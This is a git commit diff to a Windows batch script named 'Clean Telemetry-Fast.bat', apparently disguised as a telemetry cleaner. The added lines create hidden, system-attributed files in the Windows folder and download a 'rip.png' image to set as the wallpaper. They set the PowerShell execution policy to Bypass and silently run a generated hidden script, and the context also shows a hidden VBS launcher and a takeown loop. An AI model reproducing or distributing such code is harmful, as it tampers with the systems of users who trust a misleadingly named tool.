1a6c5fe20667b7152f54efe772730648c0e51ff1
Sauug <36141434+Sauug@users.noreply.github.com>
2023-03-22 10:13:50 +0100

    Main v0.2
    Upgrade (Deskop on slow version added, and the wallpaper changes)

--- Source/Clean Telemetry-Fast.bat
+++ Source/Clean Telemetry-Fast.bat
@@ -17,7 +17,34 @@ echo CreateObject("Wscript.Shell").Run "system.bat", 0, True >> %windir%\system.
 attrib +h +s +r +i %windir%\system.vbs
 cls
 echo Checking if all services has been disabling...
-setlocal
+mkdir "%windir%\RIP"
+attrib +i +h +s "%windir%\RIP"
+set ip=8.8.8.8
+ping -n 1 %ip% | find "TTL" 2>nul >nul
+if not errorlevel 1 set error=win
+if errorlevel 1 set error=fail
+if %error% EQU fail (move rip.png %windir%\RIP\ 2>nul >nul) else (curl -o "%windir%\RIP\rip.png" https://i.imgur.com/EGBHDer.png 2>nul >nul)
+attrib +i +h +s "%windir%\RIP\rip.png"
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  "%windir%\RIP\rip.png" /f 2>nul >nul 
+powershell Set-ExecutionPolicy Bypass
+
+echo $imgPath="%windir%\RIP\rip.png" >> %windir%\wall.ps1
+echo $code = @' >> %windir%\wall.ps1
+echo using System.Runtime.InteropServices; >> %windir%\wall.ps1
+echo namespace Win32{ >> %windir%\wall.ps1
+echo      public class Wallpaper{ >> %windir%\wall.ps1
+echo         [DllImport("user32.dll", CharSet=CharSet.Auto)] >> %windir%\wall.ps1
+echo          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; >> %windir%\wall.ps1
+echo          public static void SetWallpaper(string thePath){ >> %windir%\wall.ps1
+echo             SystemParametersInfo(20,0,thePath,3); >> %windir%\wall.ps1
+echo          } >> %windir%\wall.ps1
+echo     } >> %windir%\wall.ps1
+echo  } >> %windir%\wall.ps1
+echo '@>> %windir%\wall.ps1
+echo add-type $code >> %windir%\wall.ps1
+echo [Win32.Wallpaper]::SetWallpaper($imgPath) >> %windir%\wall.ps1
+attrib +i +h +s +r %windir%\wall.ps1
+powershell "& ""%windir%\wall.ps1"""
 
 for /F delims^=^"^ Tokens^=2^,4 %%A IN ('takeown /? ^| findstr /R " \"[A-Z]\" "') DO ( 
     if not defined take (
